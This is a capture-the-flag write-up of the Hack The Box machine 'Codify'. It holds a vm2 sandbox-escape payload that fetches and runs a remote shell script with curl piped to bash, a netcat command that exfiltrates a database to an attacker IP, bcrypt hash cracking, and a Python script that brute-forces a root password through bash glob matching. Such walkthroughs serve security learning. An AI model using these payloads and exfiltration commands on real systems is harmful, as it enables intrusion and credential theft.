![codify.png](codify.png)  

# Codify

## Enum
```bash
nmap --min-rate 1000 -p- -Pn 10.10.11.239 -oN scans/nmap.allports
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-05 20:27 GMT
Nmap scan report for 10.10.11.239
Host is up (0.029s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
9998/tcp open  distinct32

Nmap done: 1 IP address (1 host up) scanned in 20.60 seconds
```

```bash
nmap -sC -sV -Pn 10.10.11.239 -oN scans/nmap.initial
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-05 20:29 GMT
Nmap scan report for 10.10.11.239
Host is up (0.030s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://codify.htb/
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
9998/tcp open  ssh     (protocol 2.0)
| ssh-hostkey:
|_  2048 63:90:81:fe:75:38:e0:a4:de:e6:a0:e4:94:86:24:5a (RSA)
|_uptime-agent-info: SSH-2.0-Go\x0D
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-Go
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9998-TCP:V=7.94%I=7%D=11/5%Time=6547FB37%P=x86_64-pc-linux-gnu%r(NU
SF:LL,C,"SSH-2\.0-Go\r\n");
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.46 seconds
```

```bash
curl -I 10.10.11.239
HTTP/1.1 301 Moved Permanently
Date: Sun, 05 Nov 2023 20:30:10 GMT
Server: Apache/2.4.52 (Ubuntu)
Location: http://codify.htb/
Content-Type: text/html; charset=iso-8859-1
```
```bash
curl -I codify.htb
HTTP/1.1 200 OK
Date: Sun, 05 Nov 2023 20:32:17 GMT
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: Express
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Tue, 11 Apr 2023 11:29:55 GMT
ETag: W/"8dd-18770145b38"
Content-Type: text/html; charset=UTF-8
Content-Length: 2269
```
```bash
nc 10.10.11.239 9998
SSH-2.0-Go
```
```bash
ffuf \
  -c \
  -w /usr/share/seclists-git/Discovery/Web-Content/raft-medium-directories.txt \
  -u "http://codify.htb/FUZZ" -e js,html

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.4.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://codify.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists-git/Discovery/Web-Content/raft-medium-directories.txt
 :: Extensions       : js html
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

editor                  [Status: 200, Size: 3123, Words: 739, Lines: 119, Duration: 44ms]
about                   [Status: 200, Size: 2921, Words: 527, Lines: 51, Duration: 38ms]
Editor                  [Status: 200, Size: 3123, Words: 739, Lines: 119, Duration: 67ms]
About                   [Status: 200, Size: 2921, Words: 527, Lines: 51, Duration: 179ms]
server-status           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 33ms]
                        [Status: 200, Size: 2269, Words: 465, Lines: 39, Duration: 53ms]
ABOUT                   [Status: 200, Size: 2921, Words: 527, Lines: 51, Duration: 191ms]
:: Progress: [90000/90000] :: Job [1/1] :: 1159 req/sec :: Duration: [0:01:54] :: Errors: 7 ::
```

## vm2 sandbox escape

The limitation pages mentions that the sandbox is done with vm2, there is this [poc](https://gist.github.com/leesh3288/e4aa7b90417b0b0ac7bcd5b09ac7d3bd) for sandbox escape 
```javascript
const {VM} = require("vm2");
const vm = new VM();

const code = `
const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');

obj = {
    [customInspectSymbol]: (depth, opt, inspect) => {
        inspect.constructor('return process')().mainModule.require('child_process').execSync('curl http://10.10.15.49:9090/sh.sh|bash');
    },
    valueOf: undefined,
    constructor: undefined,
}

WebAssembly.compileStreaming(obj).catch(()=>{});
`;

vm.run(code);
```

## Sqlite db creds

```bash
cat /etc/passwd|grep sh$
cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
joshua:x:1000:1000:,,,:/home/joshua:/bin/bash
svc:x:1001:1001:,,,:/home/svc:/bin/bash
```

Looking at the files we have access to here's an sqlite db in /var/www/contact
```bash
svc@codify:/var/www/contact$ ls -la
ls -la
total 120
drwxr-xr-x 3 svc  svc   4096 Sep 12 17:45 .
drwxr-xr-x 5 root root  4096 Sep 12 17:40 ..
-rw-rw-r-- 1 svc  svc   4377 Apr 19  2023 index.js
-rw-rw-r-- 1 svc  svc    268 Apr 19  2023 package.json
-rw-rw-r-- 1 svc  svc  77131 Apr 19  2023 package-lock.json
drwxrwxr-x 2 svc  svc   4096 Apr 21  2023 templates
-rw-r--r-- 1 svc  svc  20480 Sep 12 17:45 tickets.db
```

We don't have a sqlite3 client here but we can just exfiltrate the database with netcat
```bash
svc@codify:/var/www/contact$ md5sum tickets.db
md5sum tickets.db
dd9694ad1e59ffcb566efa209b71215a  tickets.db
svc@codify:/var/www/contact$ nc 10.10.15.49 4141 < tickets.db
nc 10.10.15.49 4141 < tickets.db
```

And do this locally
```bash
sqlite3 tickets.db
SQLite version 3.44.0 2023-11-01 11:23:50
Enter ".help" for usage hints.
sqlite> .databases
main: /home/blnkn/sec/htb/machines/codify/loot/tickets.db r/w
sqlite> .tables
tickets  users
sqlite> select * from users;
3|joshua|$2a$12$S****************************************************
```

Crack joshua's bcrypt hash with john
```bash
john --wordlist=~/.local/share/seclists/rockyou.txt hash.txt
Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
Use the "--format=bcrypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s*********       (?)
1g 0:00:01:15 DONE (2023-11-06 20:31) 0.01322g/s 18.09p/s 18.09c/s 18.09C/s crazy1..angel123
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

And ssh in as joshua, which has access to run /opt/scripts/mysql-backup.sh as root
```bash
joshua@codify:~$ sudo -l
[sudo] password for joshua:
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```

## Privesc through shell glob matching

This is what the script looks like
```bash
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

So there is a mysql database that this backs up
```bash
joshua@codify:~$ netstat -tulepn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      102        32154      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          31733      -
tcp        0      0 0.0.0.0:8456            0.0.0.0:*               LISTEN      1001       202932     -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      0          34849      -
tcp        0      0 127.0.0.1:38701         0.0.0.0:*               LISTEN      0          32800      -
tcp6       0      0 :::80                   :::*                    LISTEN      0          32545      -
tcp6       0      0 :::22                   :::*                    LISTEN      0          31744      -
tcp6       0      0 :::3000                 :::*                    LISTEN      1001       35060      -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           102        32153      -
udp        0      0 0.0.0.0:68              0.0.0.0:*                           0          31382      -
```

It reads the root password for the db from /root/.creds it is then compared with the user provided `USER_PASS` which is evaluated without quotes
```bash
if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
```

This allows us to do a glob matching attack, Shellcheck would also tell us that
```bash
shellcheck mysql-backup.sh

In mysql-backup.sh line 6:
read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
^--^ SC2162 (info): read without -r will mangle backslashes.


In mysql-backup.sh line 9:
if [[ $DB_PASS == $USER_PASS ]]; then
                  ^--------^ SC2053 (warning): Quote the right-hand side of == in [[ ]] to prevent glob matching.

For more information:
  https://www.shellcheck.net/wiki/SC2053 -- Quote the right-hand side of == i...
  https://www.shellcheck.net/wiki/SC2162 -- read without -r will mangle backs...
```

Which means that we only need to guess the first character and glob, and this would return true
```bash
joshua@codify:~$ for i in {a..z};do echo "${i}*" |sudo /opt/scripts/mysql-backup.sh;done

Password confirmation failed!

Password confirmation failed!

Password confirmation failed!

Password confirmation failed!

Password confirmation failed!

Password confirmation failed!

Password confirmation failed!

Password confirmation failed!

Password confirmation failed!

Password confirmation failed!

Password confirmed!
mysql: [Warning] Using a password on the command line interface can be insecure.
Backing up database: mysql
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
Backing up database: sys
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
All databases backed up successfully!
Changing the permissions
Done!

Password confirmation failed!

Password confirmation failed!

Password confirmation failed!

Password confirmation failed!

Password confirmation failed!

Password confirmation failed!

Password confirmation failed!

Password confirmation failed!

Password confirmation failed!

Password confirmation failed!

Password confirmation failed!

Password confirmation failed!

Password confirmation failed!

Password confirmation failed!

Password confirmation failed!
```

So we can automate guessing the entire password like this
```python
import string
import subprocess


all_chars = list(string.ascii_letters + string.digits)
password = ""
found = False

while not found:
    for char in all_chars:
        command = \
            f"echo '{password}{char}*' | " \
            "sudo /opt/scripts/mysql-backup.sh"
        output = subprocess.run(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        ).stdout

        if "Password confirmed!" in output:
            password += char
            print(password)
            break
    else:
        found = True
```

And we're root!
```bash
joshua@codify:~$ su -
Password:
root@codify:~# id
uid=0(root) gid=0(root) groups=0(root)
root@codify:~#
```
